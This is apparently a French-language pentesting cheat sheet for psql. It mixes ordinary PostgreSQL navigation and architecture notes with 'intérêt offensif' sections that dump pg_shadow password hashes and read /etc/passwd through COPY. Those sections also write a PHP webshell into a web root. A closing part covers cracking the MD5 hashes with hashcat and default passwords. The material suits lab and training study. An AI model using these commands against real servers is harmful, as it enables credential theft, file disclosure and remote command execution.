# psql — cheat sheet

> Client en ligne de commande pour PostgreSQL.

---

## connexion

```bash
psql -h IP -p 5432 -U postgres                          # connexion standard
psql -h IP -p 5432 -U postgres -d mabase               # connexion directe à une base
PGPASSWORD=postgres psql -h IP -p 5432 -U postgres      # mot de passe en variable d'env
psql postgresql://postgres:postgres@IP:5432             # URI complète
psql postgresql://postgres:postgres@IP:5432/mabase      # URI avec base
```

---

## navigation — les essentiels

```sql
\l                          -- lister toutes les bases
\c nom_base                 -- se connecter à une base
\dt                         -- lister les tables de la base courante
\dt *.*                     -- lister toutes les tables de tous les schémas
\d nom_table                -- voir la structure d'une table
\dn                         -- lister les schémas
\du                         -- lister les utilisateurs et leurs rôles
\df                         -- lister les fonctions
\dv                         -- lister les vues
\conninfo                   -- infos sur la connexion courante
\q                          -- quitter
```

---

## lire les données

```sql
SELECT * FROM nom_table;                          -- tout le contenu
SELECT * FROM nom_table LIMIT 10;                 -- 10 premières lignes
SELECT colonne1, colonne2 FROM nom_table;         -- colonnes spécifiques
SELECT * FROM nom_table WHERE colonne='valeur';   -- avec filtre
SELECT COUNT(*) FROM nom_table;                   -- compter les lignes
```

---

## informations système

```sql
SELECT version();                                 -- version PostgreSQL
SELECT current_user;                              -- utilisateur courant
SELECT current_database();                        -- base courante
SELECT datname FROM pg_database;                  -- toutes les bases
SELECT tablename FROM pg_tables WHERE schemaname='public';  -- tables publiques
SELECT usename, passwd FROM pg_shadow;            -- users et hashes (superuser requis)
SELECT * FROM pg_user;                            -- infos utilisateurs
SELECT * FROM information_schema.tables;          -- toutes les tables
```

---

## intérêt offensif

```sql
-- récupérer les hashes des utilisateurs PostgreSQL
SELECT usename, passwd FROM pg_shadow;

-- voir les droits
SELECT * FROM information_schema.role_table_grants;

-- lire un fichier système (superuser requis)
COPY (SELECT '') TO '/tmp/test.txt';
CREATE TABLE tmp (data text);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;

-- écrire un fichier (persistance)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- exécuter une commande système (si extension installée)
SELECT system('id');
```

---

## différences MySQL vs PostgreSQL

| action | MySQL | PostgreSQL |
|--------|-------|-----------|
| lister les bases | `SHOW DATABASES;` | `\l` |
| sélectionner une base | `USE nom;` | `\c nom` |
| lister les tables | `SHOW TABLES;` | `\dt` |
| décrire une table | `DESCRIBE table;` | `\d table` |
| quitter | `\q` ou `exit` | `\q` |
| users et hashes | `SELECT * FROM mysql.user;` | `SELECT usename, passwd FROM pg_shadow;` |

---

## affichage

```sql
\x                          -- mode étendu (vertical) — équivalent de \G en MySQL
\x on                       -- activer le mode étendu
\x off                      -- désactiver
\timing                     -- afficher le temps d'exécution
\pset pager off             -- désactiver le pager (plus de "q" pour quitter)
```

---

## exemples de session complète

```bash
# connexion
PGPASSWORD=postgres psql -h 192.168.1.10 -p 5432 -U postgres

# dans psql
\l                          -- lister les bases
\c mabase                   -- sélectionner une base
\dt                         -- voir les tables
\d users                    -- structure de la table users
SELECT * FROM users;        -- contenu
SELECT usename, passwd FROM pg_shadow;  -- hashes des users PostgreSQL
\q                          -- quitter
```




# psql — commandes alternatives pour vieux serveurs

> Quand le client psql moderne est incompatible avec une vieille version PostgreSQL,
> utilise ces requêtes SQL directes à la place des commandes `\`.

---

| commande normale | alternative SQL compatible |
|-----------------|---------------------------|
| `\l` | `SELECT datname FROM pg_database;` |
| `\dt` | `SELECT tablename FROM pg_tables WHERE schemaname='public';` |
| `\d table` | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name='table';` |
| `\du` | `SELECT usename FROM pg_user;` |
| `\dn` | `SELECT nspname FROM pg_namespace;` |
| `\c base` | se reconnecter avec `psql ... -d base` depuis le shell |





---


# PostgreSQL — architecture & commandes

---

## structure générale

```
Serveur PostgreSQL
│
├── Utilisateurs / Rôles          ← niveau serveur, indépendant des bases
│   └── postgres, app_user...
│
├── Base: template0               ← modèle système, ne pas toucher
├── Base: template1               ← modèle pour nouvelles bases
├── Base: postgres                ← base par défaut, souvent vide
├── Base: wellness_booking        ← ta base applicative
│   ├── Schéma: public
│   │   ├── Table: users
│   │   ├── Table: practitioners
│   │   └── Table: appointments
│   └── Schéma: autre_schema
└── Base: autre_base
```

---

## deux niveaux à bien distinguer

### niveau serveur — utilisateurs
Les utilisateurs PostgreSQL peuvent se connecter au serveur. Ils existent indépendamment des bases de données. C'est comme les comptes Linux.

```sql
SELECT usename, passwd FROM pg_shadow;    -- users + hashes (superuser requis)
SELECT usename FROM pg_user;              -- users sans les hashes
SELECT rolname FROM pg_roles;             -- rôles (users + groupes)
```

### niveau base — tables et données
Chaque base a ses propres tables, schémas, données.

```sql
SELECT datname FROM pg_database;          -- lister les bases
SELECT tablename FROM pg_tables           -- lister les tables
    WHERE schemaname='public';
SELECT * FROM ma_table;                   -- lire les données
```

---

## tables système importantes

| table | contenu | niveau |
|-------|---------|--------|
| `pg_database` | liste des bases | serveur |
| `pg_shadow` | users + mots de passe hashés | serveur |
| `pg_user` | users sans les hashes | serveur |
| `pg_roles` | tous les rôles | serveur |
| `pg_tables` | tables de toutes les bases | base |
| `pg_namespace` | schémas | base |
| `information_schema.tables` | tables (standard SQL) | base |
| `information_schema.columns` | colonnes (standard SQL) | base |

---

## schémas

Un schéma c'est un espace de noms dans une base — comme un dossier dans un dossier.

```
Base: wellness_booking
├── Schéma: public        ← schéma par défaut, tes tables sont ici
│   ├── users
│   └── practitioners
└── Schéma: pg_catalog    ← tables système PostgreSQL
```

Par défaut tes tables sont dans le schéma `public`. C'est pour ça qu'on filtre avec `WHERE schemaname='public'`.

---

## navigation complète

```sql
-- 1. voir toutes les bases
SELECT datname FROM pg_database;

-- 2. se connecter à une base (depuis le shell)
psql -h IP -U postgres -d nom_base

-- 3. lister les tables de la base courante
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- 4. voir la structure d'une table
SELECT column_name, data_type 
FROM information_schema.columns 
WHERE table_name='nom_table';

-- 5. lire le contenu
SELECT * FROM nom_table LIMIT 10;

-- 6. récupérer les hashes des users PostgreSQL
SELECT usename, passwd FROM pg_shadow;
```

---

## différence avec MySQL

| | PostgreSQL | MySQL |
|--|-----------|-------|
| users système | `pg_shadow` | `mysql.user` |
| lister les bases | `SELECT datname FROM pg_database` | `SHOW DATABASES` |
| changer de base | reconnexion avec `-d` | `USE nom_base` |
| lister les tables | `SELECT tablename FROM pg_tables` | `SHOW TABLES` |
| schémas | oui — `public` par défaut | non |

---

## intérêt offensif

```sql
-- hashes des utilisateurs PostgreSQL
SELECT usename, passwd FROM pg_shadow;

-- lire un fichier système (superuser requis)
CREATE TABLE tmp_file (data text);
COPY tmp_file FROM '/etc/passwd';
SELECT * FROM tmp_file;
DROP TABLE tmp_file;

-- écrire un fichier (webshell si accès web)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') 
TO '/var/www/html/shell.php';
```




# PostgreSQL — cracker les hashes

---

## comment PostgreSQL stocke les mots de passe

PostgreSQL ne hashe pas juste le mot de passe — il hashe `mot_de_passe + username` ensemble :

```
md5(password + username) = hash
```

Exemple :
```bash
echo -n "postgrespostgres" | md5sum
# → 3175bce1d3201d16594cebf9d7eb3f9d
#     ↑ password  ↑ username
```

Le hash stocké dans `pg_shadow` est préfixé de `md5` :
```
md53175bce1d3201d16594cebf9d7eb3f9d
```

---

## récupérer les hashes

```sql
SELECT usename, passwd FROM pg_shadow;
```

Résultat :
```
postgres | md53175bce1d3201d16594cebf9d7eb3f9d
```

---

## vérifier manuellement un mot de passe

```bash
# format : md5(password + username)
echo -n "MOT_DE_PASSEusername" | md5sum

# exemple — tester postgres/postgres
echo -n "postgrespostgres" | md5sum
# → 3175bce1d3201d16594cebf9d7eb3f9d ← correspond au hash ? oui = trouvé
```

---

## cracker avec hashcat

PostgreSQL MD5 = mode 10 : `md5($pass.$salt)` où le sel c'est le username.

Format du fichier : `hash:username` (sans le préfixe md5)

```bash
echo "3175bce1d3201d16594cebf9d7eb3f9d:postgres" > pg_hash.txt
hashcat -m 10 pg_hash.txt /usr/share/wordlists/rockyou.txt -O
```

---

## tester les credentials par défaut en premier

Avant de lancer un brute force long — toujours tester les defaults :

```bash
echo -n "postgrespostgres" | md5sum    # postgres/postgres
echo -n "adminpostgres" | md5sum       # admin/postgres
echo -n "passwordpostgres" | md5sum    # password/postgres
```

Compare avec le hash récupéré — si ça correspond tu as le mot de passe en secondes.

---

## résumé de la session

```
1. psql -h IP -p 5432 -U postgres           # connexion
2. SELECT usename, passwd FROM pg_shadow;    # récupérer les hashes
3. echo -n "passwordusername" | md5sum       # vérifier manuellement
4. hashcat -m 10 hash:username rockyou.txt   # cracker avec wordlist
```